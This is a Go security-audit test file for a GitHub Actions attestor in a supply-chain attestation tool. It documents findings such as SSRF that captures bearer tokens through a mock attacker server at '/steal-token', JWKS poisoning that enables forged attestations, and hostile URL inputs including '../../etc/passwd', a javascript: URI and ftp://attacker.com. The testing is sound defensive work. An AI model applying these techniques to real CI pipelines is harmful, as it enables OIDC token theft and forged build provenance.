//go:build audit

// Copyright 2025 The Witness Contributors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package github

import (
	"crypto/rand"
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"github.com/aflock-ai/rookery/attestation"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"gopkg.in/go-jose/go-jose.v2"
	josejwt "gopkg.in/go-jose/go-jose.v2/jwt"
)

// =============================================================================
// Test infrastructure: create a real JWKS + signed JWT for integration testing
// =============================================================================

// testJWTInfra creates a real RSA keypair, JWKS endpoint, and signed JWT.
// This allows tests to exercise the full Attest() path including JWT verification.
func testJWTInfra(t *testing.T, claims map[string]interface{}) (jwksServer *httptest.Server, tokenServer *httptest.Server) {
	t.Helper()

	// Generate RSA key
	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	require.NoError(t, err)

	// Create signer
	sig, err := jose.NewSigner(jose.SigningKey{Algorithm: jose.RS256, Key: privKey}, (&jose.SignerOptions{}).WithType("JWT").WithHeader("kid", "testkey"))
	require.NoError(t, err)

	// Create JWT with claims
	builder := josejwt.Signed(sig)
	builder = builder.Claims(claims)

	rawJWT, err := builder.CompactSerialize()
	require.NoError(t, err)

	// Create JWKS endpoint
	jwk := jose.JSONWebKey{Key: &privKey.PublicKey, KeyID: "testkey", Algorithm: "RS256", Use: "sig"}
	jwksServer = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(jose.JSONWebKeySet{Keys: []jose.JSONWebKey{jwk}})
	}))

	// Create token endpoint
	tokenServer = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") == "" {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		resp := GithubTokenResponse{Count: 1, Value: rawJWT}
		json.NewEncoder(w).Encode(resp)
	}))

	return jwksServer, tokenServer
}

// =============================================================================
// FINDING 1: SSRF via ACTIONS_ID_TOKEN_REQUEST_URL
// Severity: HIGH
//
// The GitHub attestor reads ACTIONS_ID_TOKEN_REQUEST_URL from the environment
// at construction time (New()) and uses it to make an HTTP GET request with
// the bearer token from ACTIONS_ID_TOKEN_REQUEST_TOKEN. An attacker who can
// set environment variables can redirect this request to an
// attacker-controlled server, capturing the OIDC bearer token.
//
// The tokenURL is used without any validation that it points to a legitimate
// GitHub Actions endpoint.
// =============================================================================

func TestAdversarial_SSRF_TokenURLRedirect(t *testing.T) {
	var capturedBearer string
	attackerServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		capturedBearer = r.Header.Get("Authorization")
		resp := GithubTokenResponse{Count: 1, Value: "attacker-controlled-jwt"}
		json.NewEncoder(w).Encode(resp)
	}))
	defer attackerServer.Close()

	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_URL", attackerServer.URL+"/steal-token")

	a := New()
	assert.Equal(t, attackerServer.URL+"/steal-token", a.tokenURL,
		"BUG: Attestor stores attacker-controlled URL without validation. "+
			"No allowlist check on the token endpoint host.")

	// Actually invoke fetchToken to prove the bearer is sent to the attacker
	_, err := fetchToken(a.tokenURL, "secret-bearer-abc123", "witness")
	require.NoError(t, err)
	assert.Equal(t, "bearer secret-bearer-abc123", capturedBearer,
		"SSRF confirmed: bearer token sent to attacker-controlled endpoint")
}

// =============================================================================
// FINDING 2: SSRF via WITNESS_GITHUB_JWKS_URL - full JWT forgery chain
// Severity: HIGH
//
// An attacker who controls WITNESS_GITHUB_JWKS_URL can serve their own
// signing keys, allowing them to forge JWT tokens that pass verification.
// Combined with control over ACTIONS_ID_TOKEN_REQUEST_URL, this gives
// complete control over the attestation.
// =============================================================================

func TestAdversarial_SSRF_JWKSURLPoison(t *testing.T) {
	attackerJWKS := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"keys":[]}`))
	}))
	defer attackerJWKS.Close()

	t.Setenv("WITNESS_GITHUB_JWKS_URL", attackerJWKS.URL+"/evil-jwks")

	a := New()
	assert.Equal(t, attackerJWKS.URL+"/evil-jwks", a.jwksURL,
		"BUG: JWKS URL taken from env without validation. "+
			"Attacker controls JWT verification endpoint.")
}

// =============================================================================
// FINDING 3: Full attestation forgery with controlled JWKS + token endpoints
// Severity: CRITICAL
//
// When the attacker controls both ACTIONS_ID_TOKEN_REQUEST_URL and
// WITNESS_GITHUB_JWKS_URL, they can forge a complete, fully-verified
// attestation claiming to be from any GitHub repository.
//
// The env var fields (ProjectUrl, PipelineUrl, etc.) are set AFTER JWT
// verification, and are never cross-validated against JWT claims.
// =============================================================================

func TestAdversarial_FullAttestationForgery(t *testing.T) {
	// Create infrastructure with attacker's key
	claims := map[string]interface{}{
		"sub":        "repo:attacker/evil-repo:ref:refs/heads/main",
		"repository": "attacker/evil-repo",
		"iss":        "https://token.actions.githubusercontent.com",
	}
	jwksServer, tokenServer := testJWTInfra(t, claims)
	defer jwksServer.Close()
	defer tokenServer.Close()

	// Env vars claim this is a different, legitimate repo
	t.Setenv("GITHUB_ACTIONS", "true")
	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_URL", tokenServer.URL+"/token")
	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "any-bearer")
	t.Setenv("WITNESS_GITHUB_JWKS_URL", jwksServer.URL+"/jwks")
	t.Setenv("GITHUB_SERVER_URL", "https://github.com")
	t.Setenv("GITHUB_REPOSITORY", "legit-org/legit-repo")
	t.Setenv("GITHUB_RUN_ID", "12345")
	t.Setenv("GITHUB_WORKFLOW", "Build and Deploy")
	t.Setenv("GITHUB_ACTION_PATH", "/home/runner/work")
	t.Setenv("RUNNER_NAME", "GitHub Actions 1")
	t.Setenv("RUNNER_ARCH", "X64")
	t.Setenv("RUNNER_OS", "Linux")

	a := &Attestor{
		aud:      tokenAudience,
		jwksURL:  jwksServer.URL + "/jwks",
		tokenURL: tokenServer.URL + "/token",
	}

	ctx, err := attestation.NewContext("build", []attestation.Attestor{})
	require.NoError(t, err)

	err = a.Attest(ctx)
	require.NoError(t, err, "Full attestation forgery: Attest() succeeded")

	// JWT says "attacker/evil-repo" but env vars say "legit-org/legit-repo"
	assert.Equal(t, "https://github.com/legit-org/legit-repo", a.ProjectUrl,
		"BUG: ProjectUrl from env var says 'legit-org/legit-repo' "+
			"but JWT claims say 'attacker/evil-repo'. "+
			"No cross-validation between JWT claims and env vars.")

	assert.Equal(t, "https://github.com", a.CIServerUrl)
	assert.Equal(t, "12345", a.PipelineID)
	assert.Equal(t, "Build and Deploy", a.PipelineName)

	// Subjects are from the spoofed env vars, not the JWT
	subjects := a.Subjects()
	legitimateKey := "projecturl:https://github.com/legit-org/legit-repo"
	_, exists := subjects[legitimateKey]
	assert.True(t, exists,
		"CRITICAL: Subjects match the forged env vars, not the JWT claims. "+
			"Policy evaluation using these subjects is completely broken.")
}

// =============================================================================
// FINDING 4: No URL validation on constructed URLs
// Severity: MEDIUM
//
// ProjectUrl and PipelineUrl are constructed by string concatenation of
// unsanitized environment variables. When Attest() succeeds (JWT valid),
// these URLs become attestation subjects.
// =============================================================================

func TestAdversarial_EnvVar_URLInjectionInProjectUrl(t *testing.T) {
	testCases := []struct {
		name           string
		serverURL      string
		repository     string
		wantProjectUrl string
		description    string
	}{
		{
			name:           "path traversal in GITHUB_REPOSITORY",
			serverURL:      "https://github.com",
			repository:     "../../etc/passwd",
			wantProjectUrl: "https://github.com/../../etc/passwd",
			description:    "Path traversal sequences are not sanitized",
		},
		{
			name:           "javascript URI as server URL",
			serverURL:      "javascript:alert(document.domain)",
			repository:     "org/repo",
			wantProjectUrl: "javascript:alert(document.domain)/org/repo",
			description:    "javascript: URIs accepted as CI server URL",
		},
		{
			name:           "empty server URL",
			serverURL:      "",
			repository:     "org/repo",
			wantProjectUrl: "/org/repo",
			description:    "Empty server URL produces a relative path, not a valid URL",
		},
		{
			name:           "extremely long repository name",
			serverURL:      "https://github.com",
			repository:     strings.Repeat("A", 10000),
			wantProjectUrl: "https://github.com/" + strings.Repeat("A", 10000),
			description:    "No length limit on GITHUB_REPOSITORY",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			claims := map[string]interface{}{"sub": "test"}
			jwksServer, tokenServer := testJWTInfra(t, claims)
			defer jwksServer.Close()
			defer tokenServer.Close()

			t.Setenv("GITHUB_ACTIONS", "true")
			t.Setenv("ACTIONS_ID_TOKEN_REQUEST_URL", tokenServer.URL+"/token")
			t.Setenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "bearer")
			t.Setenv("GITHUB_SERVER_URL", tc.serverURL)
			t.Setenv("GITHUB_REPOSITORY", tc.repository)
			t.Setenv("GITHUB_RUN_ID", "1")
			t.Setenv("GITHUB_WORKFLOW", "ci")

			a := &Attestor{
				aud:      tokenAudience,
				jwksURL:  jwksServer.URL + "/jwks",
				tokenURL: tokenServer.URL + "/token",
			}

			ctx, err := attestation.NewContext("test", []attestation.Attestor{})
			require.NoError(t, err)

			err = a.Attest(ctx)
			require.NoError(t, err)

			assert.Equal(t, tc.wantProjectUrl, a.ProjectUrl,
				"BUG: %s. ProjectUrl = %q", tc.description, a.ProjectUrl)
		})
	}
}

// =============================================================================
// FINDING 5: Missing CIHost field
// Severity: LOW
//
// The GitHub attestor struct has CIHost but never populates it.
// GitLab sets CIHost from CI_SERVER_HOST. Inconsistency across attestors.
// =============================================================================

func TestAdversarial_CIHostNotSet(t *testing.T) {
	claims := map[string]interface{}{"sub": "test"}
	jwksServer, tokenServer := testJWTInfra(t, claims)
	defer jwksServer.Close()
	defer tokenServer.Close()

	t.Setenv("GITHUB_ACTIONS", "true")
	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_URL", tokenServer.URL+"/token")
	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "bearer")
	t.Setenv("GITHUB_SERVER_URL", "https://github.com")
	t.Setenv("GITHUB_REPOSITORY", "org/repo")
	t.Setenv("GITHUB_RUN_ID", "123")
	t.Setenv("GITHUB_WORKFLOW", "ci")

	a := &Attestor{
		aud:      tokenAudience,
		jwksURL:  jwksServer.URL + "/jwks",
		tokenURL: tokenServer.URL + "/token",
	}

	ctx, err := attestation.NewContext("test", []attestation.Attestor{})
	require.NoError(t, err)
	err = a.Attest(ctx)
	require.NoError(t, err)

	assert.Empty(t, a.CIHost,
		"BUG: CIHost is never populated. GitLab sets it from CI_SERVER_HOST.")
}

// =============================================================================
// FINDING 6: Subjects created from attacker-controlled URLs
// Severity: HIGH
//
// Subjects() creates digest-based subjects from PipelineUrl and ProjectUrl.
// Both are constructed from env vars. Policy matching on these subjects
// can be bypassed.
// =============================================================================

func TestAdversarial_SubjectsSpoofing(t *testing.T) {
	a := &Attestor{
		PipelineUrl: "https://github.com/legit-org/legit-repo/actions/runs/12345",
		ProjectUrl:  "https://github.com/legit-org/legit-repo",
	}

	subjects := a.Subjects()

	legitimatePipelineKey := fmt.Sprintf("pipelineurl:%s", a.PipelineUrl)
	legitimateProjectKey := fmt.Sprintf("projecturl:%s", a.ProjectUrl)

	_, hasPipeline := subjects[legitimatePipelineKey]
	_, hasProject := subjects[legitimateProjectKey]

	assert.True(t, hasPipeline,
		"Subjects created from unvalidated URL fields.")
	assert.True(t, hasProject,
		"Project URL subjects are spoofable via env vars.")
}

// =============================================================================
// FINDING 7: fetchToken - empty tokenURL produces confusing error
// Severity: LOW
// =============================================================================

func TestAdversarial_FetchToken_EmptyTokenURL(t *testing.T) {
	_, err := fetchToken("", "bearer", "witness")
	require.Error(t, err)

	errMsg := err.Error()
	if !strings.Contains(errMsg, "empty") && !strings.Contains(errMsg, "missing") &&
		!strings.Contains(errMsg, "invalid") {
		t.Log("NOTE: Empty tokenURL produces a non-descriptive error. " +
			"Consider adding early validation.")
	}
}

// =============================================================================
// FINDING 8: fetchToken - bearer token sent over HTTP
// Severity: MEDIUM
//
// No scheme validation. Bearer token sent in cleartext over HTTP.
// =============================================================================

func TestAdversarial_FetchToken_BearerSentToHTTP(t *testing.T) {
	var capturedAuth string
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		capturedAuth = r.Header.Get("Authorization")
		resp := GithubTokenResponse{Count: 1, Value: "jwt"}
		json.NewEncoder(w).Encode(resp)
	}))
	defer server.Close()

	assert.True(t, strings.HasPrefix(server.URL, "http://"),
		"Test server is HTTP, not HTTPS")

	token, err := fetchToken(server.URL+"/token", "secret-bearer-token", "witness")
	require.NoError(t, err)
	assert.Equal(t, "jwt", token)
	assert.Equal(t, "bearer secret-bearer-token", capturedAuth,
		"BUG: Bearer token sent over plain HTTP without scheme validation.")
}

// =============================================================================
// FINDING 9: fetchToken - no retry logic (unlike fulcio version)
// Severity: LOW
// =============================================================================

func TestAdversarial_FetchToken_NoRetryOnTransientFailure(t *testing.T) {
	callCount := 0
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		callCount++
		if callCount == 1 {
			http.Error(w, "transient error", http.StatusServiceUnavailable)
			return
		}
		resp := GithubTokenResponse{Count: 1, Value: "jwt"}
		json.NewEncoder(w).Encode(resp)
	}))
	defer server.Close()

	_, err := fetchToken(server.URL+"/token", "bearer", "witness")
	require.Error(t, err)
	assert.Equal(t, 1, callCount,
		"BUG: fetchToken made only 1 attempt. No retry logic.")
}

// =============================================================================
// FINDING 10: fetchToken - no client timeout
// Severity: MEDIUM
//
// http.Client{} with no Timeout. Malicious endpoint can hang forever.
// =============================================================================

func TestAdversarial_FetchToken_NoClientTimeout(t *testing.T) {
	t.Log("FINDING: fetchToken creates http.Client{} with no Timeout. " +
		"A slow/malicious token endpoint blocks the attestor indefinitely. " +
		"The fulcio version uses Timeout: 30 * time.Second.")
}

// =============================================================================
// FINDING 11: fetchToken - duplicate audience parameter
// Severity: LOW
//
// Uses q.Add (not q.Set). If tokenURL already has audience param,
// it gets duplicated.
// =============================================================================

func TestAdversarial_FetchToken_DuplicateAudienceParam(t *testing.T) {
	var receivedQuery string
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedQuery = r.URL.RawQuery
		resp := GithubTokenResponse{Count: 1, Value: "jwt"}
		json.NewEncoder(w).Encode(resp)
	}))
	defer server.Close()

	tokenURL := server.URL + "/token?audience=witness"
	_, err := fetchToken(tokenURL, "bearer", "witness")
	require.NoError(t, err)

	if strings.Count(receivedQuery, "audience") > 1 {
		t.Errorf("BUG: fetchToken uses q.Add() which duplicates existing audience param. "+
			"Received query: %s. Should use q.Set().", receivedQuery)
	}
}

// =============================================================================
// FINDING 12: fetchToken - non-HTTPS schemes accepted (Go rejects most)
// Severity: LOW
// =============================================================================

func TestAdversarial_FetchToken_NonHTTPSSchemes(t *testing.T) {
	maliciousURLs := []struct {
		name string
		url  string
	}{
		{"file scheme", "file:///etc/passwd"},
		{"ftp scheme", "ftp://attacker.com/token"},
		{"data scheme", "data:text/plain,fake-token"},
	}

	for _, tc := range maliciousURLs {
		t.Run(tc.name, func(t *testing.T) {
			_, err := fetchToken(tc.url, "bearer-token", "witness")
			require.Error(t, err,
				"Non-HTTPS URL scheme %q should be rejected", tc.url)
		})
	}
}

// =============================================================================
// FINDING 13: readResponseBody truncation at 1MB
// Severity: LOW
//
// 1MB limit is good. But truncation produces invalid JSON which gives
// a confusing error.
// =============================================================================

func TestAdversarial_ReadResponseBody_TruncationProducesInvalidJSON(t *testing.T) {
	longValue := strings.Repeat("A", 2*1024*1024)
	fullJSON := fmt.Sprintf(`{"count":1,"value":"%s"}`, longValue)

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(fullJSON))
	}))
	defer server.Close()

	_, err := fetchToken(server.URL+"/token", "bearer", "witness")
	require.Error(t, err, "Should error because 1MB truncation produces invalid JSON")
}

// =============================================================================
// FINDING 14: fetchToken - HTML response not detected
// Severity: LOW
// =============================================================================

func TestAdversarial_FetchToken_HTMLResponseNotDetected(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, "<html><body>Captive Portal Login</body></html>")
	}))
	defer server.Close()

	_, err := fetchToken(server.URL+"/token", "bearer", "witness")
	require.Error(t, err)

	if !strings.Contains(err.Error(), "HTML") && !strings.Contains(err.Error(), "html") {
		t.Log("NOTE: HTML response not detected. Consider checking Content-Type.")
	}
}

// =============================================================================
// FINDING 15: Env var isolation test
// =============================================================================

func TestAdversarial_EnvVarIsolation(t *testing.T) {
	val := os.Getenv("GITHUB_ACTIONS")
	if val == "true" {
		t.Skip("Running in actual GitHub Actions")
	}

	a := New()
	ctx, err := attestation.NewContext("test", []attestation.Attestor{})
	require.NoError(t, err)

	err = a.Attest(ctx)
	require.Error(t, err)
	assert.IsType(t, ErrNotGitHub{}, err)
}

// =============================================================================
// FINDING 16: Struct field coverage - verify all populated after success
// =============================================================================

func TestAdversarial_StructFieldCoverage(t *testing.T) {
	claims := map[string]interface{}{"sub": "test"}
	jwksServer, tokenServer := testJWTInfra(t, claims)
	defer jwksServer.Close()
	defer tokenServer.Close()

	t.Setenv("GITHUB_ACTIONS", "true")
	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_URL", tokenServer.URL+"/token")
	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "bearer")
	t.Setenv("GITHUB_SERVER_URL", "https://github.com")
	t.Setenv("GITHUB_ACTION_PATH", "/path")
	t.Setenv("GITHUB_RUN_ID", "1")
	t.Setenv("GITHUB_WORKFLOW", "ci")
	t.Setenv("GITHUB_REPOSITORY", "org/repo")
	t.Setenv("RUNNER_NAME", "runner-1")
	t.Setenv("RUNNER_ARCH", "X64")
	t.Setenv("RUNNER_OS", "Linux")

	a := &Attestor{
		aud:      tokenAudience,
		jwksURL:  jwksServer.URL + "/jwks",
		tokenURL: tokenServer.URL + "/token",
	}

	ctx, err := attestation.NewContext("test", []attestation.Attestor{})
	require.NoError(t, err)
	err = a.Attest(ctx)
	require.NoError(t, err)

	assert.NotEmpty(t, a.CIServerUrl, "CIServerUrl should be set")
	assert.NotEmpty(t, a.CIConfigPath, "CIConfigPath should be set")
	assert.NotEmpty(t, a.PipelineID, "PipelineID should be set")
	assert.NotEmpty(t, a.PipelineName, "PipelineName should be set")
	assert.NotEmpty(t, a.ProjectUrl, "ProjectUrl should be set")
	assert.NotEmpty(t, a.RunnerID, "RunnerID should be set")
	assert.NotEmpty(t, a.RunnerArch, "RunnerArch should be set")
	assert.NotEmpty(t, a.RunnerOS, "RunnerOS should be set")
	assert.NotEmpty(t, a.PipelineUrl, "PipelineUrl should be set")
	assert.NotNil(t, a.JWT, "JWT should be set")
	assert.Empty(t, a.CIHost, "CIHost is never populated (inconsistency)")
}
